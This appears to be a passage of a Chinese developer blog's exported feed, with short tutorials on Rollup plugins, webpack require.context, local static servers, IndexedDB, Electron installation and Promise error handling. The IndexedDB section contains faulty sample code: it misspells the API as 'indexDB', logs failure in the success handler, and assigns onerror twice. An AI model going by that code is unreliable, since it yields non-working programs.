<h6 id="修改入口文件"><a href="#修改入口文件" class="headerlink" title="修改入口文件"></a>修改入口文件</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logVal <span class="keyword">from</span> <span class="string">&#x27;./log.js&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(logVal);</span><br></pre></td></tr></table></figure>

<h6 id="添加log-js文件"><a href="#添加log-js文件" class="headerlink" title="添加log.js文件"></a>添加<code>log.js</code>文件</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="string">&#x27;hello rollup&#x27;</span></span><br></pre></td></tr></table></figure>

<h6 id="执行打包命令"><a href="#执行打包命令" class="headerlink" title="执行打包命令"></a>执行打包命令</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm run build</span><br></pre></td></tr></table></figure>

<p>执行命令后，会发现项目目录下多了个<code>dist</code>目录，进入目录会发现有个<code>bundle.umd.js</code>文件，这就是我们在<code>rollup.config.js</code>配置文件里面配置<code>output</code>的作用。</p>
<p>使用<code>node bundle.js</code>命令，控制台会输出<code>hello rollup</code>文本信息。</p>
<p>这时候将<code>package.json</code>文件中的<code>main</code>字段修改为打包后的文件目录</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    main:<span class="string">&#x27;./dist/bundle.umd.js&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，一个简单的库就实现了。</p>
<h5 id="3、Tree-Shaking"><a href="#3、Tree-Shaking" class="headerlink" title="3、Tree-Shaking"></a>3、Tree-Shaking</h5><p><code>rollup</code>会静态分析代码中的<code>import</code>,并将排除任何未实际用上的代码，减少打包的体积。</p>
<h5 id="4、使用插件"><a href="#4、使用插件" class="headerlink" title="4、使用插件"></a>4、使用插件</h5><p>随着构建更复杂的bundle，通常需要更大的灵活性，例如引入npm安装的模块，通过Babel编译代码，和JSON文件打交道等，这时候就需要用到插件了。</p>
<p>如果想过要从<code>package.json</code>文件中读取数据，就要用到<code>rollup-plugin-json</code>插件</p>
<h6 id="安装rollup-plugin-json插件"><a href="#安装rollup-plugin-json插件" class="headerlink" title="安装rollup-plugin-json插件"></a>安装<code>rollup-plugin-json</code>插件</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i rollup-plugin-json -S</span><br></pre></td></tr></table></figure>

<h6 id="修改main-js文件如下"><a href="#修改main-js文件如下" class="headerlink" title="修改main.js文件如下"></a>修改<code>main.js</code>文件如下</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;version&#125; <span class="keyword">from</span> <span class="string">&#x27;../package.json&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(version)</span><br></pre></td></tr></table></figure>

<h6 id="修改rollup-config-js配置文件"><a href="#修改rollup-config-js配置文件" class="headerlink" title="修改rollup.config.js配置文件"></a>修改<code>rollup.config.js</code>配置文件</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 引入插件</span></span><br><span class="line"><span class="keyword">import</span> json <span class="keyword">from</span> <span class="string">&#x27;rollup-plugin-json&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    input:<span class="string">&#x27;src/main.js&#x27;</span>,</span><br><span class="line">    output:&#123;</span><br><span class="line">        file:<span class="string">&#x27;./dist/bundle.js&#x27;</span>,</span><br><span class="line">        format:<span class="string">&#x27;umd&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[json()]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行<code>npm run build</code>进行构建，使用<code>node ./dist/bundle.js</code>命令执行打包文件，得到<code>1.0.0</code>的文本输出，这样，我们就成功使用<code>rollup-plugin-json</code>插件来读取json文件的数据了。</p>
<p>关于<code>rollup</code>的更多文档说明请到[rollup中文网]](<a href="https://www.rollupjs.com/)%E8%BF%9B%E8%A1%8C%E6%9F%A5%E9%98%85%E3%80%82">https://www.rollupjs.com/)进行查阅。</a></p>
]]></content>
      <categories>
        <category>打包构建</category>
      </categories>
      <tags>
        <tag>打包构建</tag>
        <tag>rollup</tag>
      </tags>
  </entry>
  <entry>
    <title>巧用require.context实现前端工程自动化</title>
    <url>/20210601/042122.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>使用require.context实现前端工程自动化</p>
</blockquote>
<a id="more"></a>

<p>1、相关概念</p>
<p>一个webpack的api,通过执行require.context函数获取一个特定的上下文,主要用来实现自动化导入模块,在前端工程中,如果遇到从一个文件夹引入很多模块的情况,可以使用这个api,它会遍历文件夹中的指定文件,然后自动导入,使得不需要每次显式的调用import导入模块</p>
<h5 id="2、使用场景"><a href="#2、使用场景" class="headerlink" title="2、使用场景"></a>2、使用场景</h5><p>例如引入分模块进行管理的api、状态管理文件、自定义组件、指令等场景都可使用</p>
<h5 id="3、API说明"><a href="#3、API说明" class="headerlink" title="3、API说明"></a>3、API说明</h5><p>require.context(directory,useSubdirectories,regExp)</p>
<ul>
<li><p>directory：说明需要检索的目录</p>
</li>
<li><p>useSubdirectories：是否检索子目录</p>
</li>
<li><p>regExp: 匹配文件的正则表达式</p>
</li>
</ul>
<h5 id="4、使用示例"><a href="#4、使用示例" class="headerlink" title="4、使用示例"></a>4、使用示例</h5><h6 id="4-1、分模块进行管理的vuex相关文件"><a href="#4-1、分模块进行管理的vuex相关文件" class="headerlink" title="4.1、分模块进行管理的vuex相关文件"></a>4.1、分模块进行管理的vuex相关文件</h6><p><img data-src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-558672e8-7d20-4e12-a61d-9f94a5784fe8/26a4f48b-1ed4-4c97-be49-e818b21a6b3b.png"></p>
<h5 id="4-2、在index-js文件自动引入、导出"><a href="#4-2、在index-js文件自动引入、导出" class="headerlink" title="4.2、在index.js文件自动引入、导出"></a>4.2、在index.js文件自动引入、导出</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"><span class="keyword">import</span> getters <span class="keyword">from</span> <span class="string">&#x27;./getters&#x27;</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modulesFiles = <span class="built_in">require</span>.context(<span class="string">&#x27;./modules&#x27;</span>, <span class="literal">true</span>, <span class="regexp">/\.js$/</span>)</span><br><span class="line"><span class="keyword">const</span> modules = modulesFiles.keys().reduce(<span class="function">(<span class="params">modules, modulePath</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// set &#x27;./app.js&#x27; =&gt; &#x27;app&#x27;</span></span><br><span class="line">  <span class="keyword">const</span> moduleName = modulePath.replace(<span class="regexp">/^\.\/(.*)\.\w+$/</span>, <span class="string">&#x27;$1&#x27;</span>)</span><br><span class="line">  <span class="keyword">const</span> value = modulesFiles(modulePath)</span><br><span class="line">  modules[moduleName] = value.default</span><br><span class="line">  <span class="keyword">return</span> modules</span><br><span class="line">&#125;, &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  modules,</span><br><span class="line">  getters</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>推荐快速搭建本地静态资源服务器的两款工具</title>
    <url>/20201020/071228.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>如果有一个资源文件夹，通过<code>file</code>协议直接打开的话，不能发送<code>ajax</code>请求，得在<code>http</code>协议下才能使用<code>ajax</code>发送请求，这时候，我们就需要在该目录下创建静态资源服务器，以前都是通过IDE的一些插件或者功能模块来启用服务，现在推荐两款好用的工具来帮助我们快速搭建起静态资源服务器。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、http-server"><a href="#1、http-server" class="headerlink" title="1、http-server"></a>1、http-server</h5><p>安装：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g http-server</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进入到你的资源目录</span></span><br><span class="line">cd my-src</span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">http-server .</span><br></pre></td></tr></table></figure>

<p>这样就启动了该目录的静态资源服务，如果该目录存在<code>index.html</code>文件，则会显示该页面为主页，如果不存在<code>index.html</code>文件，则显示该目录静态资源列表。</p>
<p><a href="https://github.com/http-party/http-server">github传送门</a></p>
<h5 id="2、anywhere"><a href="#2、anywhere" class="headerlink" title="2、anywhere"></a>2、anywhere</h5><p>安装：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g anywhere</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 进入到你的资源目录</span></span><br><span class="line">cd my-src</span><br><span class="line"><span class="comment">// 执行命令</span></span><br><span class="line">anywhere .</span><br></pre></td></tr></table></figure>

<p><code>anywhere</code>默认启动服务后自动打开页面。</p>
<p><a href="https://github.com/Rob--W/cors-anywhere">github传送门</a></p>
]]></content>
      <categories>
        <category>实用工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器数据库IndexDB入门</title>
    <url>/20200909/015203.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>现在经常遇到一些场景，需要在浏览器客户端存储大量的数据，这样就可以不用从服务器获取数据，直接在本地进行读取操作。而浏览器提供的本地存储方案有Cookie,LocalStorage,SessionStorage,IndexDB等。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、方案对比"><a href="#1、方案对比" class="headerlink" title="1、方案对比"></a>1、方案对比</h5><ul>
<li><p>Cookie</p>
<ul>
<li>限制大小不超过4k</li>
<li>每次请求都会携带在请求头，造成一定的资源浪费</li>
</ul>
</li>
<li><p>LocalStorage</p>
<ul>
<li>存储大小据浏览器而定，但是比Cookie大了不少</li>
<li>不能建立自定义索引</li>
<li>同步执行</li>
</ul>
</li>
<li><p>IndexDB</p>
<ul>
<li>浏览器提供的本地数据库</li>
<li>支持键值对存储</li>
<li>异步执行，IndexDB操作时不会锁死浏览器，这样设计是为了防止大量数据的读写，造成页面卡顿</li>
<li>存储空间非常大</li>
<li>支持二进制存储 </li>
</ul>
</li>
</ul>
<p>基于以上的方案对比，如果是涉及到大数据量的存储的，选择IndexDB是相对比较好的解决方案。</p>
<h5 id="2、IndexDB的关键概念"><a href="#2、IndexDB的关键概念" class="headerlink" title="2、IndexDB的关键概念"></a>2、IndexDB的关键概念</h5><p>IndexDB是一个事务性数据库系统，基于Javascript的面向对象数据库。使用IndexDB执行的操作是异步执行的，以免阻塞应用程序。</p>
<h5 id="3、IndexDB的使用"><a href="#3、IndexDB的使用" class="headerlink" title="3、IndexDB的使用"></a>3、IndexDB的使用</h5><h6 id="3-1、打开数据库"><a href="#3-1、打开数据库" class="headerlink" title="3.1、打开数据库"></a>3.1、打开数据库</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> IDBRequest = <span class="built_in">window</span>.indexDB.open(<span class="string">&#x27;database_name&#x27;</span>,version);</span><br></pre></td></tr></table></figure>

<p><code>window.indexDB.open</code>方法接受的两个参数分别是数据库名称和版本号，一个是字符串，一个是整数。方法返回一个<code>IDBRequest</code>对象，是一个处理数据库请求并提供对结果访问的通用接口，该对象通过监听<code>error    </code>、<code>success</code>、<code>upgradeneeded</code>三个事件来进行一系列相关的操作。</p>
<ul>
<li><p><code>error</code>事件</p>
<p>该事件表示打开数据库失败。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>success</code>事件<br>该事件表示打开数据库成功</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">IDBRequest.onsuccess = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>upgradeneeded事件<br>该事件表示指定的版本号如果大于数据库的实际版本号，发生数据库升级事件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> db;</span><br><span class="line">IDBRequest.onupgradeneeded = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">    db = event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回调方法内通过<code>event.target.result</code>拿到数据库实例</p>
</li>
</ul>
<h6 id="3-2、新建数据库"><a href="#3-2、新建数据库" class="headerlink" title="3.2、新建数据库"></a>3.2、新建数据库</h6><p>新建数据库和打开数据库类似，代码如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> _db_instance = <span class="literal">null</span>;<span class="comment">// 数据库对象</span></span><br><span class="line"><span class="keyword">let</span> myDB = &#123;</span><br><span class="line">    name:<span class="string">&#x27;test_database&#x27;</span>,<span class="comment">// 数据库名称</span></span><br><span class="line">    version:<span class="number">1</span><span class="comment">// 数据库版本</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建数据库方法</span></span><br><span class="line"><span class="keyword">const</span> createDB = <span class="function">(<span class="params">name, version</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> IDBRequest = <span class="built_in">window</span>.indexDB.open(name,version);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听error事件</span></span><br><span class="line">    IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;打开数据库失败&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 监听success事件</span></span><br><span class="line">    IDBRequest.onerror = <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 这步之后就能通过_db_instance来访问IndexDB了</span></span><br><span class="line">        _db_instance = event.target.result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">createDB(myDB.name,myDB.version);</span><br></pre></td></tr></table></figure>



<h6 id="3-3、关闭数据库"><a href="#3-3、关闭数据库" class="headerlink" title="3.3、关闭数据库"></a>3.3、关闭数据库</h6><p>通过数据库对象的close方法来关闭数据库</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">_db_instance.close();</span><br></pre></td></tr></table></figure>



<h6 id="3-4、删除数据库"><a href="#3-4、删除数据库" class="headerlink" title="3.4、删除数据库"></a>3.4、删除数据库</h6><p>通过调用indexedDB对象的deleteDatabase方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.indexedDB.deleteDatabase(name);</span><br></pre></td></tr></table></figure>



<h6 id="3-5、新增对象存储空间"><a href="#3-5、新增对象存储空间" class="headerlink" title="3.5、新增对象存储空间"></a>3.5、新增对象存储空间</h6><p><code>IndexDB</code>使用对象存储空间而不是表，一个单独的数据库可以包含任意数量的对象存储空间。每当一个值被存储进一个对象存储空间时，它会被和一个键相关联。键的提供可以有几种不同的方法，这取决于对象存储空间是使用 key path 还是 key generator。</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!_db_instance.objectStoreNames.contains(<span class="string">&#x27;test&#x27;</span>))&#123;</span><br><span class="line">   <span class="keyword">let</span> objStore = _db_instance.createObjectStore(<span class="string">&#x27;test&#x27;</span>,&#123;<span class="attr">keyPath</span>:<span class="string">&#x27;testid&#x27;</span>&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主键是默认建立索引的属性。</p>
<ul>
<li><p>假如数据记录是<code>&#123;id:1,name:&#39;test_name&#39;&#125;</code>,那么id可以作为主键</p>
</li>
<li><p>假如数据记录是<code>&#123;obj:&#123;obj_id:1&#125;,name:&#39;test_name&#39;&#125;</code>，那么也可以设置下一层属性<code>obj.obj_id</code>作为主键</p>
</li>
<li><p>如果数据记录里面没有合适作为主键的属性，那么可以让 <code>IndexedDB </code>自动生成主键</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> objStore = _db_instance.createObjectStore(</span><br><span class="line">  <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">  &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



</li>
</ul>
<h6 id="3-6、新建索引"><a href="#3-6、新建索引" class="headerlink" title="3.6、新建索引"></a>3.6、新建索引</h6><p>新建对象存储空间后可以新建索引</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test2&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>上面对象存储仓库对象的<code>createIndex</code>方法三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值)</p>
<h6 id="3-7、新增事务"><a href="#3-7、新增事务" class="headerlink" title="3.7、新增事务"></a>3.7、新增事务</h6><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction(<span class="string">&#x27;test&#x27;</span>, model);  <span class="comment">// model可以为只读readonly或者读写readwrite</span></span><br></pre></td></tr></table></figure>



<h6 id="3-8、新增数据"><a href="#3-8、新增数据" class="headerlink" title="3.8、新增数据"></a>3.8、新增数据</h6><p>通过<code>add()</code>方法添加数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction([<span class="string">&#x27;test&#x27;</span>], model);</span><br><span class="line"><span class="keyword">let</span> objStore = transition.objectStore(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line">objStore.add(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>, <span class="attr">email</span>: <span class="string">&#x27;zhangsan@example.com&#x27;</span> &#125;);</span><br></pre></td></tr></table></figure>



<h6 id="3-9、删除数据"><a href="#3-9、删除数据" class="headerlink" title="3.9、删除数据"></a>3.9、删除数据</h6><p>通过<code>delete()</code>方法删除数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.delete(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h6 id="3-10、更新数据"><a href="#3-10、更新数据" class="headerlink" title="3.10、更新数据"></a>3.10、更新数据</h6><p>通过<code>put()</code>方法更新数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.put(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span>, <span class="attr">age</span>: <span class="number">35</span>, <span class="attr">email</span>: <span class="string">&#x27;lisi@example.com&#x27;</span> &#125;)</span><br></pre></td></tr></table></figure>



<h6 id="3-11、读取数据"><a href="#3-11、读取数据" class="headerlink" title="3.11、读取数据"></a>3.11、读取数据</h6><p>通过<code>get()</code>方法读取数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.get(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>



<h6 id="3-12、使用索引"><a href="#3-12、使用索引" class="headerlink" title="3.12、使用索引"></a>3.12、使用索引</h6><p>假设新建对象存储空间的时候对<code>test1</code>字段建立了索引。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">objStore.createIndex(<span class="string">&#x27;test1&#x27;</span>, <span class="string">&#x27;test1&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br></pre></td></tr></table></figure>

<p>现在，就可以从<code>test1</code>找到对应的数据记录了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> transition = _db_instance.transaction([<span class="string">&#x27;test&#x27;</span>], <span class="string">&#x27;readonly&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> objStore transaction.objectStore(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> index = objStore.index(<span class="string">&#x27;test1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = index.get(<span class="string">&#x27;李四&#x27;</span>);</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = e.target.result;</span><br><span class="line">  <span class="keyword">if</span> (result) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>本地存储，IndexDB</tag>
      </tags>
  </entry>
  <entry>
    <title>解决electron依赖包安装失败的问题</title>
    <url>/20201019/074625.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>在使用npm安装electron依赖包的时候，进度老是卡住，导致安装失败。于是上网查询了一下，主要的还是要修改一下electron依赖包的镜像源，这样就能解决这个安装耗时失败的问题，亲测有效。</p>
</blockquote>
<a id="more"></a>

<p>首先设置npm的electron镜像源：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm config set ELECTRON_MIRROR <span class="string">&quot;https://cdn.npm.taobao.org/dist/electron/&quot;</span></span><br></pre></td></tr></table></figure>

<p>然后就可以全局安装<code>electron</code>了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm i -g electron</span><br></pre></td></tr></table></figure>

<p>最后<code>electron -v</code>可以得知<code>electron</code>安装成功</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">electron -v</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>electron</category>
      </categories>
      <tags>
        <tag>electron</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Uncaught (in promise)问题</title>
    <url>/20210930/025627.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>如果发现项目在运行的时候，控制台会输出报错信息Uncaught (in promise)，这是由于项目中使用到的Promise被 reject但没有经过reject处理器进行处理，catch方法就是reject处理器。如果没有通过catch进行reject的处理的话，在浏览器控制台就会输出Uncaught (in promise)的报错信息。</p>
</blockquote>
<a id="more"></a>

<p>如果想要处理这种在控制台输出报错信息的情况，那么需要用到unhandledrejection事件，当Promise被reject且没有reject处理器的时候，就会触发unhandledrejection事件，可以通过监听该事件对未处理的reject进行捕获</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unhandledrejection&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; promise, reason&#125; = event;</span><br><span class="line">  <span class="built_in">console</span>.log(promise)</span><br><span class="line">  <span class="built_in">console</span>.log(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>事件对象包括两个信息：</p>
<p>promise（reject状态没有被进行处理的特定的Promise）</p>
<p>reason（将会传入异常处理方法的错误原因）</p>
<p>如果想要阻止信息输出在控制台，可以使用event.preventDefault()阻止默认事件行为来实现</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unhandledrejection&#x27;</span>, <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">	event.preventDefault()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>错误处理</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次基于el-table组件的前端分页</title>
    <url>/20201022/072037.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>今天，在和后端同事对接口的时候，有个需要分页的接口，由于数据量不大，他是一次性返回给我，希望由我这边进行分页处理。于是，我这边基于<code>el-table</code>表格组件进行了前端的表格分页处理，在这里做个记录。</p>
</blockquote>
<a id="more"></a>

<h5 id="核心代码："><a href="#核心代码：" class="headerlink" title="核心代码："></a>核心代码：</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tabelData.slice((pageIndex - 1) * pageSize, pageIndex * pageSize)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">el-table</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="slice说明："><a href="#slice说明：" class="headerlink" title="slice说明："></a><code>slice</code>说明：</h5><blockquote>
<p><code>arrayObject.slice(start, end)</code>返回一个新的数组，包含从 start 到 end （不包括该元素）的 arrayObject 中的元素。</p>
</blockquote>
<p>这样，就快速简单地实现了基于<code>el-table</code>的前端分页处理。</p>
]]></content>
      <categories>
        <category>问题记录</category>
      </categories>
      <tags>
        <tag>问题记录</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP笔记整理</title>
    <url>/20201006/081025.html</url>
    <content><![CDATA[<h5 id="HTTP（Hypertext-Transfer-Protocal）协议"><a href="#HTTP（Hypertext-Transfer-Protocal）协议" class="headerlink" title="HTTP（Hypertext Transfer Protocal）协议"></a>HTTP（Hypertext Transfer Protocal）协议</h5><blockquote>
<p>a stateless application-level request/response protocal that uses extensible semantics and self-descriptive message payloads for flexible interaction with network-based hypertext information systems（RFC7230 2014.6）</p>
<p>一种无状态的、应用层的、以请求/应答方式运行的协议，它使用可扩展的语义和自描述消息格式，与基于网络的超文本信息系统灵活的互动。</p>
</blockquote>
<a id="more"></a>

<h5 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h5><ul>
<li><p>支持客户/服务器模式</p>
<ul>
<li>客户/服务器模式工作的方式是由客户端向服务器发起请求，服务器端响应请求，并进行相应服务</li>
</ul>
</li>
<li><p>简单快速</p>
<ul>
<li>客户向服务器请求服务时，只需传送请求方法和路径</li>
<li>请求方法常用的有<code>GET</code>、<code>HEAD</code>、<code>POST</code>。每种方法规定了客户与服务器联系的类型不同</li>
<li>由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快</li>
</ul>
</li>
<li><p>灵活</p>
<ul>
<li>HTTP允许传输任意类型的数据对象</li>
<li>正在传输的类型由<code>Content-Type</code>加以标记</li>
</ul>
</li>
<li><p>无连接</p>
<ul>
<li>无连接的含义是限制每次连接只处理一个请求</li>
<li>服务器处理完客户的请求，并接收到客户的应答后，即断开连接</li>
<li>采用这种方式可以节省传输时间</li>
</ul>
</li>
<li><p>无状态</p>
<ul>
<li>HTTP协议是无状态协议</li>
<li>无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则必须重传，这样可能导致每次连接传送的数据量大</li>
<li>在服务器不需要先前信息时，它的应答就较快</li>
</ul>
</li>
</ul>
<h5 id="URL和URI"><a href="#URL和URI" class="headerlink" title="URL和URI"></a>URL和URI</h5><ul>
<li>URI：一个紧凑的字符串用来标示抽象或物理资源</li>
<li>一个URI可以进一步被分为定位符、名字或两者都是</li>
<li>URL是URI的子集，除了确定一个资源，还提供了一种定位该资源的主要访问机制</li>
<li>URI可以分为URL,URN或同时具备locators和names特性的一个东西</li>
<li>URN作用就好像一个人的名字，URL就像一个人的地址，URN确定了东西的身份，URL提供了找到它的方式</li>
<li>URL是URI的一种，但不是所有的URI都是URL</li>
<li>URI和URL最大的差别是“访问机制”</li>
<li>URN是唯一标识的一部分，是身份信息</li>
</ul>
<h5 id="HTTP报文结构"><a href="#HTTP报文结构" class="headerlink" title="HTTP报文结构"></a>HTTP报文结构</h5><ul>
<li><strong>请求报文：</strong></li>
</ul>
<p><img data-src="/images/HTTP/http_request.png" alt="http_request"></p>
<ul>
<li><strong>响应报文：</strong></li>
</ul>
<p><img data-src="/images/HTTP/http_response.png" alt="http_response"></p>
<ul>
<li><p><strong>HTTP报文头：</strong></p>
<ul>
<li><p>通用报文头</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Cache-Control</td>
<td>控制缓存的行为</td>
</tr>
<tr>
<td>Connection</td>
<td>逐跳首部、连接的管理</td>
</tr>
<tr>
<td>Date</td>
<td>创建报文的日期时间</td>
</tr>
<tr>
<td>Pragma</td>
<td>报文指令</td>
</tr>
<tr>
